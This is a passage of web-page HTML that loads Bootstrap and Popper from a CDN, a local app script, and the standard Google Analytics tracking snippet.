src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-E8EH9MYEVL"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-E8EH9MYEVL'); }); </script>
